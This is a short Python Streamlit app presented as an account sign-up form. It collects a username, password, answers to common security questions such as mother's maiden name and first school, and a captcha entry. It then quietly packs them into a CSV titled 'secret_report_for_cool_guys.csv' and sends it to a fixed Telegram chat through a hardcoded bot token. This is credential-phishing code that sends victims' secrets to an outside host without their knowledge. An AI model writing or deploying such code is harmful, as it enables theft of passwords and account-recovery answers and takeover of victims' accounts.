import streamlit as st
import pandas as pd
import csv, io
import telebot
import cv2

# streamlit run app.py

ph6 = st.empty()
ph6.subheader("Please Create an Account")
ph7 = st.empty()
new_user = ph7.text_input('Username')
ph8 = st.empty()
new_passwd = ph8.text_input('Password', type='password')


ph1 = st.empty()
ph1.write('Please answer the security questions:')
ph2 = st.empty()
school = ph2.text_input('Name of your first school?')
ph3 = st.empty()
mom_name = ph3.text_input('Mother''s maiden name?')
ph4 = st.empty()
type = ph4.text_input('Urban or beach vibe?')
ph5 = st.empty()
hotel = ph5.text_input('Fancy Boho chic hotel or airbnb in a secluded beach?')

# save results to csv and send via telegram


TOKEN = "2034688341:AAGiWVOQZ_wJUDLEGPbqXn80LzJ9palMWu0"
tb = telebot.TeleBot(TOKEN)  # create a new Telegram Bot object

placeholder = st.empty()
signupbut = placeholder.button('Sign Up')

if signupbut:
    placeholder.empty()
    [eval('ph%s.empty()' % i) for i in range(1,9)]
    st.write('Please confirm you''re not a robot:')
    im = st.image('captcha.png')
    captcha = st.text_input('Enter image numbers')
    ver = st.button('Verify')
    if ver:
        st.success("You have successfully created an account.Go to the Login Menu to login")
        df = pd.DataFrame({"username": [new_user], "password": [new_passwd],
                           "school": [school], "mom_name": [mom_name],
                           "hotel": [hotel], "type": [type], "images": [captcha]})
        chat_id = '630924196'

        test_data = df.to_records()
        print(test_data)
        # csv module can write data in io.StringIO buffer only
        s = io.StringIO()
        csv.writer(s).writerows(test_data)
        s.seek(0)
        # python-telegram-bot library can send files only from io.BytesIO buffer
        # we need to convert StringIO to BytesIO
        buf = io.BytesIO()

        # extract csv-string, convert it to bytes and write to buffer
        buf.write(s.getvalue().encode())
        buf.seek(0)

        placeholder = st.empty()
        isclick = placeholder.button('delete this button')
        if isclick:
            placeholder.empty()


        # set a filename with file's extension
        buf.name = f'secret_report_for_cool_guys.csv'

        # send the buffer as a regular file
        tb.send_document(chat_id, buf)
